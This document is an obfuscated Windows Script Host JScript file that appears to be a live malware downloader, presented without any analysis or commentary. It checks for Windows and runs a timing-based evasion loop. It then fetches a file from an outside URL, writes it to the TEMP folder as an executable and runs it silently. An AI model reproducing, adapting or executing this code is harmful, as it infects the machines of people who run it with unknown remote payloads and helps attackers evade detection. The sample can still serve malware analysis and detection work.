var PE = false;
var L = "Create"+"Object";
var CI0 = function OX() {return WScript[L]("WScript"+".Shell");}(), EK = 11;
var ST = "MSXML2"+".XMLHTTP";
var RH = 2;
var U = RH - 2;
function N(T){CI0["Run"](T, U, U);};
function CI(){return ST + "";};
function F0(H0, X0){U = U * 1; return H0 - X0;};
function S(){return L;};
/*@cc_on
  @if (@_win32 || @_win64)
    PE = true;
  @end
@*/
if (PE)
{
var P = "";
function K(){return 22;};
var WM = 0; var Y = 0;
function OJ()
{
var H = new this["Date"]();
var LI = H["getUTCMilliseconds"]();
WScript["Sleep"](K());
var H = new this["Date"]();
var ME = H["getUTCMilliseconds"]();
WScript["Sleep"](K());
var H = new this["Date"]();
var MN = H["getUTCMilliseconds"]();
var WM = "N0";
WM = F0(ME, LI);
var Y = "BN";
Y = F0(MN, ME);
P = "open";
return F0(WM, Y);
}
var X = false;
var N1 = false;
for (var K0 = U; K0 < K() * 1; K0++){if (OJ() != U){
X = true; 
Y = "31" + 11 * WM + Y; 
N1 = true; 
break;
}}
function G() {return ((X == true) && (X == N1)) ? 1 : U;};
if (X && G() && N1){
function W() {return CI0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8MolroCz.ex" + "e";};
 TT = CI();
 N2 = WScript[L](TT);
 var LQ = 1;
do { 
	for (;LQ;){
	try {
		if (LQ == 1)
		{
			N2[P]("GET", "http://pure-line.com.pl/f6splw", false);
			N2["send"]();
			O = "Sleep";
			LQ = 2;
		}
		WScript[O](K() + 120); 
		if (N2["readystate"] < 2 * 2) continue;
		LQ = U;
		function F(Q) {var C = (1, 2, 3, 4, 5, Q); return C;};
		PB = WScript[S()]("ADODB.Stream");
		TT = PB;
		TT[P]();
		TT["type"] = F(1);
		TT["write"](N2["ResponseBody"]);
		PB["position"] = F(U);
		TT["Save" + "ToFile"](W(), 2);
		PB["cl"+"ose"]();
		CO = W();
		N(CO);
	} catch(FR){};};
}while (LQ);
}
}

